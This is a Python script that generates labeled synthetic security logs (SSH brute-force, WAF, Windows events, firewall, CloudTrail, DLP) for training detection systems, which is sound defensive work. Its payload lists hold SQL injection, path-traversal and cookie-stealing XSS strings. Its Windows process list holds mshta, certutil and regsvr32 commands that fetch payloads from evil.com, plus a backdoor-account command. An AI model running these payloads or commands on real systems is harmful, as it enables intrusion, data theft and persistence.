"""
Phase 3 — Generate synthetic security logs for gap-filling.
Produces realistic, labeled training data across 6 log types.
"""
import json, random, string
from pathlib import Path
from datetime import datetime, timedelta, timezone
from faker import Faker

fake = Faker()
BASE = Path(__file__).parent
RAW  = BASE / "raw"

# ── helpers ──────────────────────────────────────────────────────────────────
def rand_ts(start: datetime, end: datetime) -> datetime:
    delta = (end - start).total_seconds()
    return start + timedelta(seconds=random.uniform(0, delta))

def internal_ip() -> str:
    return f"10.{random.randint(0,10)}.{random.randint(1,254)}.{random.randint(1,254)}"

def external_ip() -> str:
    # avoid RFC1918 / loopback
    while True:
        a = random.randint(1, 223)
        if a not in (10, 127, 169, 172, 192):
            return f"{a}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        if a == 172 and not (16 <= random.randint(0,255) <= 31):
            return f"{a}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

USERS      = [fake.user_name() for _ in range(40)]
HOSTNAMES  = [f"srv-{fake.word()}-{random.randint(1,99):02d}" for _ in range(20)]
ATTACKER_IPS = [external_ip() for _ in range(30)]
NORMAL_SRC   = [external_ip() for _ in range(100)]

START = datetime(2026, 4, 1, tzinfo=timezone.utc)
END   = datetime(2026, 4, 30, tzinfo=timezone.utc)

def ts_fmt(dt: datetime) -> str:
    return dt.strftime("%Y-%m-%dT%H:%M:%S.000Z")

def syslog_ts(dt: datetime) -> str:
    return dt.strftime("%b %d %H:%M:%S")

print("━"*60)
print("  PHASE 3 — Synthetic Log Generation")
print("━"*60)

# ─────────────────────────────────────────────────────────────────────────────
# A) SSH Brute-Force auth.log
# ─────────────────────────────────────────────────────────────────────────────
out_path = RAW / "syslog" / "synthetic_ssh_bruteforce.log"
lines = []

# 1. Normal successful logins (baseline ~2000 lines)
for _ in range(2000):
    dt   = rand_ts(START, END)
    user = random.choice(USERS)
    ip   = internal_ip()
    pid  = random.randint(10000, 40000)
    host = random.choice(HOSTNAMES)
    port = random.randint(49000, 65000)
    lines.append((dt, f"{syslog_ts(dt)} {host} sshd[{pid}]: Accepted password for {user} from {ip} port {port} ssh2"))
    lines.append((dt + timedelta(seconds=1), f"{syslog_ts(dt + timedelta(seconds=1))} {host} sshd[{pid}]: pam_unix(sshd:session): session opened for user {user} by (uid=0)"))

# 2. Brute-force clusters (10,000 failures across 50 attack campaigns)
for campaign in range(50):
    atk_ip   = random.choice(ATTACKER_IPS)
    target   = random.choice(USERS + ["root", "admin", "ubuntu", "ec2-user"])
    host     = random.choice(HOSTNAMES)
    burst_start = rand_ts(START, END)
    failures = random.randint(150, 300)
    for i in range(failures):
        dt  = burst_start + timedelta(seconds=i * random.uniform(0.3, 2.5))
        pid = random.randint(10000, 40000)
        port = random.randint(49000, 65000)
        lines.append((dt, f"{syslog_ts(dt)} {host} sshd[{pid}]: Failed password for {target} from {atk_ip} port {port} ssh2"))
    # 50% campaigns succeed at the end
    if random.random() < 0.5:
        success_dt = burst_start + timedelta(seconds=failures * 2)
        pid = random.randint(10000, 40000)
        port = random.randint(49000, 65000)
        lines.append((success_dt, f"{syslog_ts(success_dt)} {host} sshd[{pid}]: Accepted password for {target} from {atk_ip} port {port} ssh2"))

# Sort by timestamp and write
lines.sort(key=lambda x: x[0])
with open(out_path, "w") as f:
    for _, line in lines:
        f.write(line + "\n")
print(f"  ✓ SSH brute-force   : {len(lines):>7,} lines → {out_path.name}")

# ─────────────────────────────────────────────────────────────────────────────
# B) Apache WAF access.log
# ─────────────────────────────────────────────────────────────────────────────
out_path = RAW / "waf_web" / "synthetic_waf_attacks.log"

NORMAL_PATHS = [
    "/", "/index.html", "/about", "/products", "/api/v1/status",
    "/api/v1/users/profile", "/static/main.js", "/static/style.css",
    "/favicon.ico", "/robots.txt", "/api/v1/search?q=shoes",
]
METHODS = ["GET"] * 8 + ["POST"] * 2
UA_NORMAL = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
    'curl/7.88.1',
]
SQLI_PAYLOADS = [
    "' OR '1'='1", "' OR 1=1--", "1' UNION SELECT null,username,password FROM users--",
    "1'+OR+1=1--", "1'+UNION+SELECT+null,table_name+FROM+information_schema.tables--",
    "'; DROP TABLE users;--", "' AND SLEEP(5)--", "1 OR 1=1",
    "admin'--", "' OR 'x'='x",
]
XSS_PAYLOADS = [
    "<script>alert(1)</script>", "javascript:alert(document.cookie)",
    "<img src=x onerror=alert(1)>", "\"><script>fetch('//evil.com?c='+document.cookie)</script>",
    "<svg onload=alert(1)>",
]
TRAVERSAL_PAYLOADS = [
    "/../../../etc/passwd", "/../../etc/shadow", "/../../../windows/system32/cmd.exe",
    "/%2e%2e/%2e%2e/etc/passwd", "/....//....//etc/passwd",
]
SCANNER_UAS = [
    "sqlmap/1.7.8#stable (https://sqlmap.org)",
    "Nikto/2.1.6",
    "Nmap Scripting Engine",
    "Mozilla/5.0 (compatible; Googlebot/2.1; masscan/1.3)",
    "gobuster/3.6",
    "dirbuster/1.0",
    "python-requests/2.31.0 (scanner)",
]

waf_lines = []
TOTAL_REQUESTS = 15000

for _ in range(TOTAL_REQUESTS):
    dt    = rand_ts(START, END)
    roll  = random.random()

    if roll < 0.60:     # Normal traffic
        ip     = random.choice(NORMAL_SRC)
        method = random.choice(METHODS)
        path   = random.choice(NORMAL_PATHS)
        status = random.choices([200,200,200,301,304,404], weights=[7,7,7,1,2,1])[0]
        size   = random.randint(200, 50000)
        ua     = random.choice(UA_NORMAL)
    elif roll < 0.75:   # SQL injection
        ip     = random.choice(ATTACKER_IPS)
        method = "GET"
        base   = random.choice(["/api/v1/products?id=", "/search?q=", "/login?user="])
        path   = base + random.choice(SQLI_PAYLOADS)
        status = random.choices([200, 500, 403], weights=[4, 4, 2])[0]
        size   = random.randint(500, 95000)
        ua     = random.choice(UA_NORMAL)
    elif roll < 0.85:   # XSS
        ip     = random.choice(ATTACKER_IPS)
        method = random.choice(["GET", "POST"])
        path   = "/comment?text=" + random.choice(XSS_PAYLOADS)
        status = random.choices([200, 400, 403], weights=[5, 3, 2])[0]
        size   = random.randint(300, 5000)
        ua     = random.choice(UA_NORMAL)
    elif roll < 0.95:   # Path traversal
        ip     = random.choice(ATTACKER_IPS)
        method = "GET"
        path   = random.choice(TRAVERSAL_PAYLOADS)
        status = random.choices([200, 403, 404], weights=[1, 5, 4])[0]
        size   = random.randint(100, 8000)
        ua     = random.choice(UA_NORMAL)
    else:               # Scanner traffic
        ip     = random.choice(ATTACKER_IPS)
        method = random.choice(["GET", "HEAD"])
        path   = random.choice(NORMAL_PATHS + ["/admin", "/.env", "/wp-admin/", "/phpmyadmin/"])
        status = random.choices([200, 404, 403], weights=[2, 6, 2])[0]
        size   = random.randint(100, 2000)
        ua     = random.choice(SCANNER_UAS)

    ts_clf = dt.strftime("%d/%b/%Y:%H:%M:%S +0000")
    line   = f'{ip} - - [{ts_clf}] "{method} {path} HTTP/1.1" {status} {size} "-" "{ua}"'
    waf_lines.append((dt, line))

waf_lines.sort(key=lambda x: x[0])
with open(out_path, "w") as f:
    for _, line in waf_lines:
        f.write(line + "\n")
print(f"  ✓ WAF access.log    : {len(waf_lines):>7,} lines → {out_path.name}")

# ─────────────────────────────────────────────────────────────────────────────
# C) Windows Security Events (CEF syslog-forwarded)
# ─────────────────────────────────────────────────────────────────────────────
out_path = RAW / "syslog" / "synthetic_windows_events.log"

WIN_EVENTS = {
    4624: ("Successful Logon",          "benign"),
    4625: ("Failed Logon",              "malicious"),
    4648: ("Logon with explicit creds", "malicious"),
    4720: ("User account created",      "malicious"),
    4688: ("Process creation",          "mixed"),
}
SUSPICIOUS_PROCS = [
    'powershell.exe -nop -w hidden -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMA',
    'cmd.exe /c whoami && net user hacker P@ss123 /add',
    'wscript.exe C:\\Users\\Public\\payload.vbs',
    'mshta.exe http://evil.com/payload.hta',
    'certutil.exe -urlcache -split -f http://evil.com/malware.exe',
    'regsvr32.exe /s /n /u /i:http://evil.com/payload.sct scrobj.dll',
    r'rundll32.exe javascript:"\..\\mshtml,RunHTMLApplication"',
]
NORMAL_PROCS = [
    'C:\\Windows\\System32\\svchost.exe -k netsvcs',
    'C:\\Program Files\\Microsoft Office\\WINWORD.EXE',
    'C:\\Windows\\explorer.exe',
    'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
    'C:\\Windows\\System32\\taskhostw.exe',
]

cef_lines = []
for _ in range(12000):
    dt     = rand_ts(START, END)
    host   = random.choice(HOSTNAMES)
    user   = random.choice(USERS)
    src_ip = internal_ip()
    roll   = random.random()

    if roll < 0.55:     # Normal logon (4624)
        eid   = 4624
        proc  = random.choice(NORMAL_PROCS)
        sev   = 2
    elif roll < 0.70:   # Failed logon burst (4625) — password spray
        eid   = 4625
        proc  = ""
        user  = random.choice(USERS + ["admin", "root", "administrator"])
        src_ip = random.choice(ATTACKER_IPS)
        sev   = 7
    elif roll < 0.80:   # Explicit credential (4648)
        eid   = 4648
        proc  = "runas.exe"
        src_ip = random.choice(ATTACKER_IPS)
        sev   = 8
    elif roll < 0.87:   # User created (4720)
        eid   = 4720
        proc  = "net.exe"
        user  = f"svc_{fake.word()}"
        sev   = 9
    else:               # Process creation (4688)
        eid   = 4688
        if random.random() < 0.3:
            proc = random.choice(SUSPICIOUS_PROCS)
            sev  = 9
            src_ip = random.choice(ATTACKER_IPS)
        else:
            proc = random.choice(NORMAL_PROCS)
            sev  = 2

    desc = WIN_EVENTS[eid][0]
    ts_str = ts_fmt(dt)
    cef = (
        f"CEF:0|Microsoft|Windows Security|1.0|{eid}|{desc}|{sev}|"
        f"start={ts_str} src={src_ip} dhost={host} duser={user} "
        f"cs1Label=Process cs1={proc!r} msg={desc}"
    )
    cef_lines.append((dt, cef))

cef_lines.sort(key=lambda x: x[0])
with open(out_path, "w") as f:
    for _, line in cef_lines:
        f.write(line + "\n")
print(f"  ✓ Windows CEF events: {len(cef_lines):>7,} lines → {out_path.name}")

# ─────────────────────────────────────────────────────────────────────────────
# D) JSON Firewall / Network logs (NDJSON)
# ─────────────────────────────────────────────────────────────────────────────
out_path = RAW / "json_cloud" / "synthetic_firewall.json"

fw_records = []
KNOWN_BAD_RANGES = ["185.220.", "45.33.", "198.51.100.", "203.0.113.", "192.0.2."]

for _ in range(10000):
    dt      = rand_ts(START, END)
    roll    = random.random()
    src     = internal_ip()
    sport   = random.randint(49000, 65000)
    dport   = random.choice([80, 443, 22, 3389, 8080, 445, 3306, 5432])
    proto   = "TCP"
    action  = "ALLOW"
    label   = "benign"
    attack  = None
    bytes_  = random.randint(200, 5000)

    if roll < 0.65:     # Normal outbound
        dst = external_ip()
        dport = random.choice([80, 443])
    elif roll < 0.75:   # Connection to known bad IP
        prefix = random.choice(KNOWN_BAD_RANGES)
        dst    = prefix + str(random.randint(1, 254))
        label  = "malicious"
        attack = "c2_communication"
        action = "ALLOW"
    elif roll < 0.83:   # Port scan (sequential ports from same src)
        dst   = external_ip()
        dport = random.randint(1, 1024)
        bytes_= random.randint(40, 100)
        label = "malicious"
        attack= "port_scan"
    elif roll < 0.91:   # Large outbound (exfiltration)
        dst    = external_ip()
        dport  = random.choice([443, 80, 21])
        bytes_ = random.randint(50_000_000, 500_000_000)
        label  = "malicious"
        attack = "data_exfiltration"
    else:               # Blocked inbound
        src    = external_ip()
        dst    = internal_ip()
        action = "DENY"
        label  = "malicious"
        attack = "inbound_probe"

    fw_records.append({
        "timestamp":    ts_fmt(dt),
        "src_ip":       src,
        "dst_ip":       dst,
        "src_port":     sport,
        "dst_port":     dport,
        "protocol":     proto,
        "action":       action,
        "bytes_sent":   bytes_,
        "hostname":     random.choice(HOSTNAMES),
        "label":        label,
        "attack_type":  attack,
    })

fw_records.sort(key=lambda r: r["timestamp"])
with open(out_path, "w") as f:
    for r in fw_records:
        f.write(json.dumps(r) + "\n")
print(f"  ✓ Firewall NDJSON   : {len(fw_records):>7,} records → {out_path.name}")

# ─────────────────────────────────────────────────────────────────────────────
# E) CloudTrail-style AWS logs (NDJSON)
# ─────────────────────────────────────────────────────────────────────────────
out_path = RAW / "json_cloud" / "synthetic_cloudtrail.json"

AWS_USERS  = [f"svc-{fake.word()}" for _ in range(10)] + ["app-deploy", "ci-runner", "root"]
AWS_NORMAL = [
    ("S3",  "GetObject",          "arn:aws:s3:::company-assets"),
    ("S3",  "PutObject",          "arn:aws:s3:::company-uploads"),
    ("EC2", "DescribeInstances",  None),
    ("EC2", "DescribeSecurityGroups", None),
    ("IAM", "GetUser",            None),
    ("STS", "AssumeRole",         None),
    ("S3",  "ListBuckets",        None),
]
AWS_ATTACK = [
    ("IAM", "AttachUserPolicy",  "arn:aws:iam::aws:policy/AdministratorAccess", "privilege_escalation", "T1098.003"),
    ("IAM", "CreateAccessKey",   None,                                           "persistence",          "T1098.001"),
    ("IAM", "CreateUser",        None,                                           "persistence",          "T1136.003"),
    ("S3",  "GetObject",         "arn:aws:s3:::company-secrets",                 "data_exfiltration",    "T1530"),
    ("EC2", "RunInstances",      None,                                           "resource_hijacking",   "T1578"),
    ("CloudTrail", "DeleteTrail", None,                                          "defense_evasion",      "T1070"),
    ("IAM", "UpdateLoginProfile", None,                                          "privilege_escalation", "T1098"),
]

ct_records = []
for _ in range(8000):
    dt   = rand_ts(START, END)
    user = random.choice(AWS_USERS)
    ip   = external_ip() if random.random() < 0.3 else internal_ip()
    roll = random.random()

    if roll < 0.80:
        svc, ev, res = random.choice(AWS_NORMAL)
        label  = "benign"
        attack = None
        mitre  = None
        ua     = "aws-cli/2.15.0"
    else:
        svc, ev, res, attack, mitre = random.choice(AWS_ATTACK)
        label = "malicious"
        user  = random.choice(AWS_USERS)
        ip    = random.choice(ATTACKER_IPS)
        ua    = "Boto3/1.34.0 Python/3.11.0"

    rec = {
        "eventTime":       ts_fmt(dt),
        "eventSource":     f"{svc.lower()}.amazonaws.com",
        "eventName":       ev,
        "userIdentity":    {"type": "IAMUser", "userName": user, "principalId": f"AIDA{''.join(random.choices(string.ascii_uppercase+string.digits, k=16))}"},
        "sourceIPAddress": ip,
        "userAgent":       ua,
        "requestParameters": {"policyArn": res} if res else {},
        "responseElements": None,
        "eventType":       "AwsApiCall",
        "label":           label,
        "attack_type":     attack,
        "mitre_technique": mitre,
    }
    ct_records.append(rec)

ct_records.sort(key=lambda r: r["eventTime"])
with open(out_path, "w") as f:
    for r in ct_records:
        f.write(json.dumps(r) + "\n")
print(f"  ✓ CloudTrail NDJSON : {len(ct_records):>7,} records → {out_path.name}")

# ─────────────────────────────────────────────────────────────────────────────
# F) DLP event logs (NDJSON)
# ─────────────────────────────────────────────────────────────────────────────
out_path = RAW / "json_cloud" / "synthetic_dlp_events.json"

DLP_RESOURCES = [
    "payroll_Q1_2026.xlsx", "employee_database.csv", "source_code.zip",
    "customer_pii.csv",     "financial_report.pdf",  "contracts_signed.zip",
    "aws_credentials.txt",  "README.md",             "config.yaml", "logo.png",
]
EXT_DOMAINS = ["gmail.com", "yahoo.com", "proton.me", "hotmail.com"]

dlp_records = []
for _ in range(5000):
    dt     = rand_ts(START, END)
    user   = random.choice(USERS)
    host   = random.choice(HOSTNAMES)
    roll   = random.random()

    if roll < 0.65:
        action  = "file_access"
        res     = random.choice(DLP_RESOURCES)
        sev     = "low"
        label   = "benign"
        attack  = None
        count   = 1
    elif roll < 0.78:
        action  = "mass_download"
        res     = random.choice(["payroll_Q1_2026.xlsx", "employee_database.csv", "customer_pii.csv"])
        sev     = "critical"
        label   = "malicious"
        attack  = "data_exfiltration"
        count   = random.randint(50, 200)
    elif roll < 0.88:
        action  = "usb_transfer"
        res     = random.choice(DLP_RESOURCES)
        sev     = "high"
        label   = "malicious"
        attack  = "data_exfiltration"
        count   = random.randint(5, 30)
    else:
        action  = "email_external"
        res     = random.choice(["payroll_Q1_2026.xlsx", "contracts_signed.zip", "source_code.zip"])
        sev     = "high"
        label   = "malicious"
        attack  = "data_exfiltration"
        ext_dom = random.choice(EXT_DOMAINS)
        count   = 1

    dlp_records.append({
        "timestamp":    ts_fmt(dt),
        "user":         user,
        "hostname":     host,
        "action":       action,
        "resource":     res,
        "file_count":   count,
        "severity":     sev,
        "destination":  ext_dom if action == "email_external" else ("USB" if action == "usb_transfer" else host),
        "label":        label,
        "attack_type":  attack,
        "mitre_technique": "T1048" if label == "malicious" else None,
    })

dlp_records.sort(key=lambda r: r["timestamp"])
with open(out_path, "w") as f:
    for r in dlp_records:
        f.write(json.dumps(r) + "\n")
print(f"  ✓ DLP NDJSON        : {len(dlp_records):>7,} records → {out_path.name}")

# ─────────────────────────────────────────────────────────────────────────────
# SUMMARY
# ─────────────────────────────────────────────────────────────────────────────
totals = {
    "ssh_bruteforce":    len(lines),
    "waf_access":        len(waf_lines),
    "windows_cef":       len(cef_lines),
    "firewall_json":     len(fw_records),
    "cloudtrail_json":   len(ct_records),
    "dlp_json":          len(dlp_records),
}
grand = sum(totals.values())

print(f"\n{'━'*60}")
print(f"  PHASE 3 SUMMARY — {grand:,} synthetic records generated")
print(f"{'━'*60}")
for k, v in totals.items():
    print(f"  {k:<25} {v:>8,} records")
print(f"\n  ✓ Phase 3 complete — proceed to Phase 4 (normalizer)")
